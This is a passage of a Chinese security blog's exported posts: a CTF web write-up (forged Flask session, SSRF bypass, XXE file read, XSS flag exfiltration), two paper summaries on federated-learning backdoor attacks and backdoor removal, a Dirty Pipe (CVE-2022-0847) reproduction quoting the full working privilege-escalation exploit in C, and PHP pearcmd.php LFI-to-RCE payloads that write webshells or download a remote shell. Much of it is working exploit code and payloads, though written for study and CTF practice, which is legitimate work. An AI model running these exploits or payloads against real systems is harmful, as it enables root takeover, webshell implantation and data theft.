methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def game(): token = request.cookies.get(\u0026#39;token\u0026#39;) form = GameForm() if not token: error_message = \u0026#39;Please login first\u0026#39; return render_template(\u0026#39;game.html\u0026#39;, form=form, error_message=error_message) payload = decode_jwt(token) if not payload: error_message = \u0026#39;Invalid or expired token. Please login again.\u0026#39; return render_template(\u0026#39;game.html\u0026#39;, form=form, error_message=error_message) if not payload[\u0026#39;username\u0026#39;]==\u0026#39;admin\u0026#39;: error_message = \u0026#39;You do not have permission to access this page.Your username is not admin\u0026#39; return render_template(\u0026#39;game.html\u0026#39;, form=form, error_message=error_message) user_input = None if form.validate_on_submit(): user_input = form.user_input.data user_input = game_play(user_input) return render_template(\u0026#39;game.html\u0026#39;, form=form, user_input=user_input) @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload(): token = request.cookies.get(\u0026#39;token\u0026#39;) if not token: flash(\u0026#39;Please login first\u0026#39;, \u0026#39;warning\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) payload = decode_jwt(token) form = UploadForm() if not payload or payload[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: error_message = \u0026#39;You do not have permission to access this page.Your username is not admin.\u0026#39; return render_template(\u0026#39;upload.html\u0026#39;, form=form, error_message=error_message, username=payload[\u0026#39;username\u0026#39;]) if not session[\u0026#39;role\u0026#39;] or session[\u0026#39;role\u0026#39;] != \u0026#39;admin\u0026#39;: error_message = \u0026#39;You do not have permission to access this page.Your role is not admin.\u0026#39; return render_template(\u0026#39;upload.html\u0026#39;, form=form, error_message=error_message, username=payload[\u0026#39;username\u0026#39;]) if form.validate_on_submit(): file = form.avatar.data if file: filename = secure_filename(file.filename) files = {\u0026#39;file\u0026#39;: (filename, file.stream, file.content_type)} php_service_url = \u0026#39;http://127.0.0.1/upload.php\u0026#39; response = requests.post(php_service_url, files=files) if response.status_code == 200: flash(response.text, \u0026#39;success\u0026#39;) else: flash(\u0026#39;Failed to upload file to PHP service\u0026#39;, \u0026#39;danger\u0026#39;) return render_template(\u0026#39;upload.html\u0026#39;, form=form) @app.route(\u0026#39;/view_uploads\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def view_uploads(): token = request.cookies.get(\u0026#39;token\u0026#39;) form = GameForm() if not token: error_message = \u0026#39;Please login first\u0026#39; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) payload = decode_jwt(token) if not payload: error_message = \u0026#39;Invalid or expired token. Please login again.\u0026#39; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) if not payload[\u0026#39;username\u0026#39;]==\u0026#39;admin\u0026#39;: error_message = \u0026#39;You do not have permission to access this page.Your username is not admin\u0026#39; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) user_input = None if form.validate_on_submit(): filepath = form.user_input.data pathurl = request.form.get(\u0026#39;path\u0026#39;) if (\u0026#34;www.testctf.com\u0026#34; not in pathurl) or (\u0026#34;127.0.0.1\u0026#34; in pathurl) or (\u0026#39;/var/www/html/uploads/\u0026#39; not in filepath) or (\u0026#39;.\u0026#39; in filepath): error_message = \u0026#34;www.testctf.com must in path and /var/www/html/uploads/ must in filepath.\u0026#34; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) params = {\u0026#39;s\u0026#39;: filepath} try: response = requests.get(\u0026#34;http://\u0026#34;+pathurl, params=params, timeout=1) return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, user_input=response.text) except: error_message = \u0026#34;500! Server Error\u0026#34; return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, error_message=error_message) return render_template(\u0026#39;view_uploads.html\u0026#39;, form=form, user_input=user_input) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.clear() response = make_response(redirect(url_for(\u0026#39;login\u0026#39;))) response.delete_cookie(\u0026#39;token\u0026#39;) flash(\u0026#39;You have been logged out\u0026#39;, \u0026#39;info\u0026#39;) return response if __name__ == \u0026#39;__main__\u0026#39;: app.run() 可以看到还有个session，但是有key，很容易构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flask import Flask, session app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;36f8efbea152e50b23290e0ed707b4b0\u0026#39; @app.route(\u0026#39;/login\u0026#39;) def login(): # 设置用户角色为 admin session[\u0026#39;role\u0026#39;] = \u0026#39;admin\u0026#39; return \u0026#39;Logged in as admin\u0026#39; @app.route(\u0026#39;/session\u0026#39;) def show_session(): # 显示当前会话信息 return f\u0026#34;Current session role: {session.get(\u0026#39;role\u0026#39;, \u0026#39;Not logged in\u0026#39;)}\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 打开本地页面拿到session即可，或者别的脚本也可以\n根据过滤条件我们很容易发现view_uploads处有个ssrf，很容易绕过:\n1 csrf_token=IjliOWJjYmFiOTYwNWM4NGY4MjFjYzc1OWQ3Njg2OGZlMTMyNjkzNGYi.ZyCzUA.G0Mp5_49tYfctHqZH2Keox5bYy4\u0026amp;path=www.testctf.com@localhost/index.php\u0026amp;user_input=%2Fvar%2Fwww%2Fhtml%2Fuploads%2F20de556e638eb01cd3e5fdd0a08d4167\u0026amp;submit=Submit 尝试访问index.php，回显：\n1 2 3 The value of user_input is: /var/www/html/uploads/20de556e638eb01cd3e5fdd0a08d4167Failed to load XML file. 考虑xxe\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE x[ \u0026lt;!ENTITY k1te SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=flag.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;person\u0026gt; \u0026lt;name\u0026gt;\u0026amp;k1te;\u0026lt;/name\u0026gt; \u0026lt;/person\u0026gt; 由于有waf，编码绕过：\n1 cat payload | iconv -f utf-8 -t utf-16be \u0026gt; payload.xml flag：\n1 2 3 The value of user_input is: /var/www/html/uploads/054891ca373134a47a817ed3be4dc1d6name: PD9waHAKJGZsYWc9IndkZmxhZ3thdWZod3BwNnRxMTRhbTdiazIzN3BieXl6dzJuZzQ4d30iOwo= 其实应该打一个无回显的，但是刚好撞对了\nweb02 刚开始没去扫目录，导致打cookie打了半天，最后才发现有个/flag路由\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;script\u0026gt;fetch(\u0026#39;/flag\u0026#39;) .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { var flag = data; fetch(\u0026#39;/content/2755d0d0eb060eabc05e8196479af6ba\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, body: new URLSearchParams({ content: flag }) }); }); \u0026lt;/script\u0026gt; ","date":"2024-10-31T12:12:36+08:00","permalink":"https://k1te.cn/p/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84web%E5%85%A8wp/","title":"2024网鼎杯青龙组Web全WP"},{"content":"Info NeurIPS 2023\nVanderbilt University等\n代码地址：sail-research/iba: IBA: Towards Irreversible Backdoor Attacks in Federated Learning (Poster at NeurIPS 2023)\nAbstract 联合学习（FL）是一种分布式学习方法，它能在不损害终端设备的个人潜在敏感数据的情况下，在分散数据上训练机器学习模型。然而，分布式性质和未经调查的数据直观地引入了新的安全漏洞，包括后门攻击。在这种情况下，敌方会在训练过程中将后门功能植入全局模型中，从而激活该功能，在输入任何特定敌方模式时引发所需的不当行为。尽管在触发和扭曲模型行为方面取得了显著的成功，但 FL 中先前的后门攻击往往持有不切实际的假设、有限的不可察觉性和持久性。具体来说，对手需要控制足够多的客户端，或者知道其他诚实客户端的数据分布。在许多情况下，插入的触发器往往是直观可见的，而且如果将对手从训练过程中移除，后门效应很快就会被削弱。为了解决这些局限性，我们在 FL 中提出了一种新颖的后门攻击框架\u0026ndash;不可逆后门攻击（Irreversible Backdoor Attacks, IBA），它可以共同学习最佳的、视觉上隐蔽的触发器，然后逐步将后门植入全局模型。这种方法可以让敌方在躲避人类和机器检查的同时实施后门攻击。此外，我们还通过选择性地毒化最不可能由主任务学习过程更新的模型参数，并将毒化模型更新限制在全局模型附近，从而提高了所提攻击的效率和持久性。最后，我们在几个基准数据集（包括 MNIST、CIFAR-10 和 Tiny ImageNet）上对所提出的攻击框架进行了评估，评估结果表明，与其他后门攻击相比，IBA 在绕过现有后门防御措施并实现更持久后门效果的同时，还取得了很高的成功率。总体而言，IBA为 FL 中的后门攻击提供了一种更有效、隐蔽和持久的方法。\nContributions 提出了一种两阶段联邦学习后门攻击方法IBA，动态生成触发器，并且是不可见后门攻击，保证了推理阶段不被发现。IBA将污染模型的更新限制在全球模型附近，降低恶意更新被检测出来的风险。 在学习过程中选择不太可能更新的模型参数进行投毒，增加持久性。 最先进的攻击性能、隐蔽性、持久性。 Thread Model 攻击者A仅控制一个客户端k，并且它将在每k轮中参与训练，即固定频率攻击；\n攻击者A能够完全控制客户端A，但是无法访问其他的良性客户端；\n假设A完全了解中央服务器和任何可能的防御措施，但是不能改变服务器的参数和算法。\nMethod 首先讲解一下大致的流程，如下图所示，其实非常简单，主要分为两个阶段，第一个阶段是触发器的生成，第二个阶段是后门的注入。看起来好像平平无奇，下面讲一下各个步骤的具体的点。\nTrigger Generating 噪声的生成函数如下，函数G是触发生成函数，函数T是后门图像生成函数： $$ T_\\xi(x) = x + G_\\xi(x), \\parallel G_\\xi(x) \\parallel_\\infty\\le\\epsilon,\\forall x $$\n函数G的迭代过程如下： $$ \\xi \\larr \\xi - \\eta_\\xi \\sum_{x\\in \\mathcal{D} } \\mathcal{L}\\xi (f{w_k}(T_\\xi(x)),y_T) $$\n其中，$f_w$是训练好的本地模型，将其作为替代模型，$y_T$是目标标签。\n作者说这一想法来自于对抗攻击，但其实与传统的无目标对抗完全相反，无目标对抗的目标函数将样本的预测结果与本身的标签最大化，而生成函数G的目标则是最大化样本的预测结果与后门的目标标签，这样做的结果就是将生成的噪声与目标类对齐，或者说，将其指向目标类内部，没错，这就是之前Narcissus的做法，你可以将生成的噪声看作肉眼不可见的目标类图像，附加在输入上，模型一看到便将其识别为目标类，效果十分好。\nBackdoor Injecting 作者的目标是生成一个本地的后门模型$f_w$​​，其目标函数如下： $$ \\min_{w} \\sum_{x \\in \\mathcal{D}} \\alpha \\mathcal{L}{\\text{clean}}(f{w_k}(x), y_x) + \\beta \\mathcal{L}{\\text{poison}}(f{w_k}(T_{\\xi}(x)), y_T) $$\n普通的后门攻击的损失函数只有后半段，最小化后门图像的预测结果和目标标签即可，但是本文还加上了前半段，即普通的分类优化函数，前半段提高ACC，后半段提高ASR，应该确实可以有效提高ACC，但是所付出的代价呢？能力有限，先存疑吧。\nAttack Model Retraining 由于我们将本地模型$f_w$作为替代模型得到触发生成模型$G$，而本地模型是一直变化的，因此作者提出我们的生成模型G需要频繁地进行更新，使其与全局模型保持同步。\nPartial Model Poisoning 部分模型污染旨在通过选择特定的污染空间和维度来增强攻击的持久性和有效性。这种方法的关键在于：\n基于空间的污染：通过限制模型的参数，使其保持在良性模型的附近，从而帮助攻击绕过基于后门的防御。 基于维度的污染：通过缩小被污染的神经元，减小来自良性客户端的稀释效应。 Poisoned-Space Based 数学不是特别好，下面的解释来自于ChatGPT：\n在这种攻击下，提交的本地模型通过其参数的大小限制而部分被污染。具体来说，攻击者对良性数据集 D和被污染数据集 D‘ 的损失应用投影梯度下降。这里的关键步骤是：\n投影过程：定期将模型参数投影到以全局模型为中心的球体上。这样可以确保产生的被污染模型与原始模型的偏差不会太大。\n数学表达：这可以通过公式表示为： $$ \\parallel w_k - w \\parallel \\le \\delta $$ 其中 $w_k$是本地模型，$w$是全局模型，$\\delta$是允许的最大偏差。\n此外，这种攻击策略可以与模型替换结合使用，通过在发送模型到服务器之前对模型参数进行缩放，来抵消其他诚实客户端的贡献。具体的缩放模型计算公式为： $$ \\hat{w_k} \\simeq w_k + \\sum_{i\\in C \\setminus k}\\frac{n_i}{n_{\\mathcal{C} \\setminus k}} (w_k - w^*). $$\n这里，$n_i$是客户端$i$的样本数量，$n_{\\mathcal{C} \\setminus k}$是所有其他客户端的样本总数，$ w^*$是理想的全局模型。\nPoisoning-dimension based 由于攻击者无法参与每一轮训练，直接提交被污染的模型到服务器是无效的。为了解决这个问题，提出了利用历史梯度变化选择不常更新的神经元作为污染维度的方法。具体步骤如下：\n选择维度：计算梯度向量g的底部k%坐标，这些坐标是基于在干净数据 D上学习主要任务得到的梯度。\n数学表达： $$ \\beta_t \\larr \\frac{p-1}{p}*\\beta + \\frac{1}{p} * \\beta \\text \\quad{使得} \\quad \\beta_t=bottom_k(g_t) $$\n其中 p是到第 t轮为止，攻击者被选中参与 FL 训练的轮数。\n投影梯度：当完成本地模型 $f_w$的梯度计算 $\\hat{g}$后，攻击者将梯度投影到 $\\hat{g}$的坐标约束上，只针对底部k%的坐标进行污染。\n这样，只有底部k%的坐标被污染，这可以延长后门效果，因为其他良性客户端很少更新这些坐标。利用历史信息帮助确定每一轮的底部k%坐标，随着轮次的推进和本地客户端模型向全局模型的收敛，这一信息变得更加重要。\nExperiments 数据集：CIFAR、MNIST、Tiny ImageNet\n1.不同攻击场景：不同联邦聚合方法：\n2.不同防御方法：\n3.不可感知性：\n前两行是良性图像，后两行是后门图像\n4.持久性：\nFuture Directions 生成自ChatGPT：\n开发对抗联邦学习后门攻击的防御机制：由于联邦学习是分布式和去中心化的，这一特点带来了独特的挑战。因此，需要开发针对这种特殊环境的鲁棒防御机制，以有效应对后门攻击。 将方法推广至多样化的联邦学习场景：将本文提出的方法推广至具有异构数据（如非独立同分布数据）的联邦学习设置中，以更全面地理解攻击的有效性。 探索替代的触发器及其在隐蔽性和成功率上的影响：研究不同类型的触发器，分析它们在提高攻击隐蔽性和成功率方面的作用，从而获取更多有价值的见解。 在更大规模和实际场景中评估框架：在更大规模的联邦学习系统和现实场景中评估该框架，以检验其可扩展性和实用性。 推进对抗防御策略：研究包括主动检测和缓解技术在内的对抗防御策略，为更安全、值得信赖的联邦学习系统做出贡献。 ","date":"2024-10-23T13:34:53+08:00","permalink":"https://k1te.cn/p/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BBiba-towards-irreversible-backdoor-attacks-in-federated-learning/","title":"【论文阅读】IBA: Towards Irreversible Backdoor Attacks in Federated Learning"},{"content":"Info CVPR 2023\nXi’an Jiaotong University、Xidian University\n代码地址：https://github.com/John-niu-07/BPE\nAbstract 众所周知，深度神经网络(DNN)既容易受到后门攻击，也容易受到对抗攻击。在文献中，这两类攻击通常被视为不同的问题并分别解决，因为它们分别属于训练时攻击和推理时攻击。然而，在本文中，我们发现了它们之间一个有趣的联系：对于一个植入后门的模型，我们观察到其对抗样本与其后门图像具有相似的行为，即两者都激活了相同的DNN神经元子集。它表明，在模型中植入后门将显著影响模型的对抗样本。基于这些观察结果，我们提出了一种新的渐进式后门擦除(Progressive Backdoor Erasing, PBE)算法，通过利用非目标对抗性攻击来逐步净化受感染的模型。与以前的后门防御方法不同，我们方法的一个显著优势是，即使在干净的额外数据集不可用的情况下，它也可以擦除后门。我们的实验表明，对于5种最先进的后门攻击，我们的PBE可以有效地擦除后门，而对干净的样本没有明显的性能下降，并且性能优于现有的防御方法。\nKey Insight 现在有两个模型，一个是干净模型benign，一个是被植入了WaNet后门的infected(无论是一个All-to-All模型还是十个All-to-One模型结果都显著，见原文4.3)，然后使用10000张随机的CIFAR-10图像对这两个模型分别进行对抗攻击，结果发现得到的结果截然不同：对于benign模型，如下图的(a)所示，对抗样本被随机均匀地分类为不同的label，而对于infected模型来说，对抗样本被分类的label与后门的target label高度相关，如图(b)所示，与其他类别相比，它更有可能被分类为目标类。众所周知，后门样本也会被后门模型分类为target label（废话），因此后门模型的对抗样本可以视为其后门样本，也就是原文所说的\u0026quot;后门模型的对抗样本与其后门图像具有相似的行为\u0026quot;。\n为了进一步验证作者的猜想，作者测量了不同图像之间的特征相似度，如下图，我们有干净图像x，干净模型的对抗样本$\\widetilde x$，后门模型的对抗样本$\\widetilde x ^{\\prime}$，以及后门图像$x^t$，通过比较他们特征图的$l_2$距离，显然，后门图像$x^t$和$\\widetilde x ^{\\prime}$的距离远小于它和对抗样本$\\widetilde x ^{\\prime}$之间的距离，也就是说，我们可以将后门模型的对抗样本$\\widetilde x ^{\\prime}$当作后门图像$x^t$来使用，这是本文的方法的核心。对于这一发现，作者给出的解释是：“当后门植入模型时，一些DNN神经元会被触发激活，称为’后门神经元‘。当对受感染的模型进行对抗攻击时，这些‘后门神经元’更有可能在生成对抗性示例时被选择/锁定和激活。”\nTheoretical Analysis 假设有一个线性模型，权重为$W=(w_1,w_2,\u0026hellip;,w_K)$，后门模型的权重则为$\\widetilde W ^\\ast=(\\widetilde w_1,\\widetilde w_2,\u0026hellip;,\\widetilde w_K)$，后门图像为$x^t = x + P$，假设在扰动$\\tau \u0026gt; 0$的影响下我们的线性模型也可以正确分类，并且这个$\\tau$足够大，以至于小扰动不影响分类结果。\n在上面的假设下，我们有扰动$r$，以及其在P方向上的投影$r_ \\perp$，那么它有下界：\n上述公式可以看出，当将扰动$r$投影在触发P的方向上时，投影$r_ \\perp$在完整的扰动$r$中占据了重要的部分。这意味着扰动$r$与触发P非常相似，这证明了我们的观察是合理的。\nThread Model 假设攻击者可以控制训练数据并且已经将后门植入到模型之中。\n在本文中，有两种防御设定。一种类似于其他”模型修复“，拥有感染模型和一个额外的干净数据集，还有一种类似于”数据过滤“，可以访问训练数据集，但是没有额外的干净数据集。\nMethod 如算法1所示，渐进式后门擦除PBE大致可以分为三步，假设现在可以访问训练数据集但是没有额外的干净数据集。\n首先，从训练集中随机采样一些图像(可能有后门图像也可能有干净图像)作为初始数据集$D_{ext}^0$，然后利用这些图像对后门模型$\\theta^{\\prime}$进行无目标对抗攻击，得到相应的对抗样本$\\widetilde x ^{\\prime}$，在前面的key insight中我们已经发现后门模型的对抗样本$\\widetilde x ^{\\prime}$可以视为后门图像$x^t$，也就说我们现在得到了标签是干净的后门图像（由于目前的后门攻击中投毒率已经越来越低，因此抽取的图像全是后门图像的概率并不大），因此我们可以使用这些图像将后门模型之前学习的后门信息”纠正过来“，于是开始第一次fine-tuning，这一步目的是为了降低ASR。 在第t次迭代中我们有额外数据集$D_{ext}^t$，前面说过这个数据集从训练集中随机采样得到，因此有一部分图像是干净的，我们可以利用这些图像进行第二次fine-tuning，这一步的目的是提高ACC。 额外数据集$D_{ext}^t$中显然会有后门图像，这些图像无论是对于第一步降低ASR还是第二步提高ACC都会产生负面影响，因此这一步的目的是尽可能剔除$D_{ext}^t$中的后门图像，得到更干净的$D_{ext}^{t+1}$。这一步的原理是我们有原始的后门模型$\\theta^{\\prime}$，还有一个上一步得到的更加干净的模型$\\theta^{t}$，显然后门图像在这两个模型中的表现不同，而干净图像则应该表现一致，由于模型$\\theta^{t}$不一定足够干净，因此根据模型输出的每个类别的概率进行判断，而不是仅仅看predicted label，至此，我们得到更加干净的数据集$D_{ext}^{t+1}$，回到第一步，进行下一轮迭代，最终得到净化模型$\\theta^{T}$​。 如果是第一种有额外的干净数据集的设定，那么可以直接跳过第三步，只需要运行第一步和第二步一次即可，称之为对抗微调(Adversarial Fine-Tuning, AFT)。\nExperiment 对比了若干防御方法在若干攻击方法上面的效果，数据集只有两个，分别是CIFAR-10和GTSRB，结果如下：\n","date":"2024-10-11T17:28:36+08:00","permalink":"https://k1te.cn/p/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BBprogressive-backdoor-erasing-via-connecting-backdoor-and-adversarial-attacks/","title":"【论文阅读】Progressive Backdoor Erasing via connecting Backdoor and Adversarial Attacks"},{"content":"简介 攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe”\n漏洞编号：CVE-2022-0847\n影响版本： Linux内核 5.8 及之后版本\n环境配置 Ubuntu20.04默认内核版本是5.4：\n1 2 root@ee399f8033c1:/# uname -r 5.4.0-100-generic 我们需要安装5.8及以上的内核，当然直接下载内核版本比较高的发行版也可以，比如kali。\n我们可以去Index of /~kernel-ppa/mainline (ubuntu.com)找到我们需要的内核，这里选的5.16的:\n下载：\n1 wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.16/amd64/linux-image-unsigned-5.16.0-051600-generic_5.16.0-051600.202201092355_amd64.deb https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.16/amd64/linux-modules-5.16.0-051600-generic_5.16.0-051600.202201092355_amd64.deb 安装：\n1 dpkg -i linux*.deb 更新grub系统引导并重启:\n1 2 update-grub reboot POC1 第一个是作者自己发表的：The Dirty Pipe Vulnerability\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 /* SPDX-License-Identifier: GPL-2.0 */ /* * Copyright 2022 CM4all GmbH / IONOS SE * * author: Max Kellermann \u0026lt;max.kellermann@ionos.com\u0026gt; * * Proof-of-concept exploit for the Dirty Pipe * vulnerability (CVE-2022-0847) caused by an uninitialized * \u0026#34;pipe_buffer.flags\u0026#34; variable. It demonstrates how to overwrite any * file contents in the page cache, even if the file is not permitted * to be written, immutable or on a read-only mount. * * This exploit requires Linux 5.8 or later; the code path was made * reachable by commit f6dd975583bd (\u0026#34;pipe: merge * anon_pipe_buf*_ops\u0026#34;). The commit did not introduce the bug, it was * there before, it just provided an easy way to exploit it. * * There are two major limitations of this exploit: the offset cannot * be on a page boundary (it needs to write one byte before the offset * to add a reference to this page to the pipe), and the write cannot * cross a page boundary. * * Example: ./write_anything /root/.ssh/authorized_keys 1 $\u0026#39;\\nssh-ed25519 AAA......\\n\u0026#39; * * Further explanation: https://dirtypipe.cm4all.com/ */ #define _GNU_SOURCE #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/user.h\u0026gt; #ifndef PAGE_SIZE #define PAGE_SIZE 4096 #endif /** * Create a pipe where all \u0026#34;bufs\u0026#34; on the pipe_inode_info ring have the * PIPE_BUF_FLAG_CAN_MERGE flag set. */ static void prepare_pipe(int p[2]) { if (pipe(p)) abort(); const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ); static char buffer[4096]; /* fill the pipe completely; each pipe_buffer will now have the PIPE_BUF_FLAG_CAN_MERGE flag */ for (unsigned r = pipe_size; r \u0026gt; 0;) { unsigned n = r \u0026gt; sizeof(buffer) ? sizeof(buffer) : r; write(p[1], buffer, n); r -= n; } /* drain the pipe, freeing all pipe_buffer instances (but leaving the flags initialized) */ for (unsigned r = pipe_size; r \u0026gt; 0;) { unsigned n = r \u0026gt; sizeof(buffer) ? sizeof(buffer) : r; read(p[0], buffer, n); r -= n; } /* the pipe is now empty, and if somebody adds a new pipe_buffer without initializing its \u0026#34;flags\u0026#34;, the buffer will be mergeable */ } int main(int argc, char **argv) { if (argc != 4) { fprintf(stderr, \u0026#34;Usage: %s TARGETFILE OFFSET DATA\\n\u0026#34;, argv[0]); return EXIT_FAILURE; } /* dumb command-line argument parser */ const char *const path = argv[1]; loff_t offset = strtoul(argv[2], NULL, 0); const char *const data = argv[3]; const size_t data_size = strlen(data); if (offset % PAGE_SIZE == 0) { fprintf(stderr, \u0026#34;Sorry, cannot start writing at a page boundary\\n\u0026#34;); return EXIT_FAILURE; } const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1; const loff_t end_offset = offset + (loff_t)data_size; if (end_offset \u0026gt; next_page) { fprintf(stderr, \u0026#34;Sorry, cannot write across a page boundary\\n\u0026#34;); return EXIT_FAILURE; } /* open the input file and validate the specified offset */ const int fd = open(path, O_RDONLY); // yes, read-only! :-) if (fd \u0026lt; 0) { perror(\u0026#34;open failed\u0026#34;); return EXIT_FAILURE; } struct stat st; if (fstat(fd, \u0026amp;st)) { perror(\u0026#34;stat failed\u0026#34;); return EXIT_FAILURE; } if (offset \u0026gt; st.st_size) { fprintf(stderr, \u0026#34;Offset is not inside the file\\n\u0026#34;); return EXIT_FAILURE; } if (end_offset \u0026gt; st.st_size) { fprintf(stderr, \u0026#34;Sorry, cannot enlarge the file\\n\u0026#34;); return EXIT_FAILURE; } /* create the pipe with all flags initialized with PIPE_BUF_FLAG_CAN_MERGE */ int p[2]; prepare_pipe(p); /* splice one byte from before the specified offset into the pipe; this will add a reference to the page cache, but since copy_page_to_iter_pipe() does not initialize the \u0026#34;flags\u0026#34;, PIPE_BUF_FLAG_CAN_MERGE is still set */ --offset; ssize_t nbytes = splice(fd, \u0026amp;offset, p[1], NULL, 1, 0); if (nbytes \u0026lt; 0) { perror(\u0026#34;splice failed\u0026#34;); return EXIT_FAILURE; } if (nbytes == 0) { fprintf(stderr, \u0026#34;short splice\\n\u0026#34;); return EXIT_FAILURE; } /* the following write will not create a new pipe_buffer, but will instead write into the page cache, because of the PIPE_BUF_FLAG_CAN_MERGE flag */ nbytes = write(p[1], data, data_size); if (nbytes \u0026lt; 0) { perror(\u0026#34;write failed\u0026#34;); return EXIT_FAILURE; } if ((size_t)nbytes \u0026lt; data_size) { fprintf(stderr, \u0026#34;short write\\n\u0026#34;); return EXIT_FAILURE; } printf(\u0026#34;It worked!\\n\u0026#34;); return EXIT_SUCCESS; } 这个poc比较粗糙，需要指定覆盖哪个文件，从第几个字符开始写，写入什么内容，因此我们可以将passwd中root的密码置空，然后再在描述处填充字符，达到提权的目的。\nPOC2 另一个poc直接修改具有suid的可执行文件，然后执行这个可执行文件提权，最后再把这个文件改回来：https://haxx.in/files/dirtypipez.c\n踩坑 刚开始想在docker上复现，拉的是ubuntu:lastest，但是尝试执行dpkg -i linux-*.deb的时候报错：\n1 2 3 4 5 dpkg: dependency problems prevent configuration of linux-image-unsigned-5.8.0-050800-generic: linux-image-unsigned-5.8.0-050800-generic depends on kmod; however: Package kmod is not installed. linux-image-unsigned-5.8.0-050800-generic depends on linux-base (\u0026gt;= 4.5ubuntu1~16.04.1); however: Package linux-base is not installed. 后面尝试执行update-grub也报错：/usr/sbin/grub-probe: error: failed to get canonical path of 'overlay'\n但是看p神的文章就是在docker中复现的，因为对docker没有很深的研究及理解，所以没能解决，等以后有空再填坑吧\n参考 https://t.zsxq.com/vJ2zjaI\nThe Dirty Pipe Vulnerability — The Dirty Pipe Vulnerability documentation (cm4all.com)\n","date":"2022-03-12T20:32:23+08:00","permalink":"https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/","title":"Dirty_pipe复现"},{"content":"前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下\npearcmd.php config-create 这个并不是上面说的新trick，而是p牛十一月份就发了的：Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)，当时十一月份湖湘杯我们还在辛苦地session文件包含，结束后发现大家都是用pearcmd.php，只能说多学习。具体原理参考上面p牛的文章，这里就单纯做个记录方便自己查阅\n这里使用的是2021湖湘杯easywill，如果仿照p牛的payload，那么最终的payload如下：\n1 ?+config-create+/\u0026amp;name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;/\u0026lt;?=phpinfo()?\u0026gt;+/tmp/hello.php (注意，请使用burp发包，否则尖括号会被url编码，此处只是演示)\n可以看到我们的name和value变量成功传入，同时$_SERVER['argv']也成功解析，需要注意的是config-create必须在$_SERVER['argv']数组的第二个位置，然后后面两个参数紧随其后，否则会报错，所以config-create前面还有一个+号，使得第0个元素为空，这个应该是php源码的处理，这里就没有再往下跟了。\n综上，我们还可以将payload改成：\n1 /?name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;+config-create+/\u0026lt;?=phpinfo()?\u0026gt;+/tmp/hello.php 可以实现同样的效果\ninstall 在学习p牛文章的过程中找到了bfengj师傅的一篇文章：利用pearcmd.php从LFI到getshell，里面介绍了pear的另一个利用方法：\n1 pear install -R /tmp http://xxxxxxx/shell.php 这个方法可以直接把我们的webshell下载到靶机从而实现RCE\n回到我们easywill的环境，payload：\n1 url?name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;+install+-R+/tmp+http://ip:port/info.php 同时，在这片文章中还学到了config-create的另一个用法：\n我们可以使用pear -c file -d foo=bar -s达到同样的写配置文件的目的，在easywill中的payload如下：\n1 /?name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;+-c+/tmp/shell.php+-d+man_dir=\u0026lt;?eval($_POST[0]);?\u0026gt;+-s+ 最后一个+号好像没有也可以。\n限制 今天早上写的时候刚好在p牛的星球看到Smity师傅发的文章，大概意思是php官方的镜像确实如p牛所说，但是如果是使用apt install php下载的php（据该师傅所言，大多数ctf 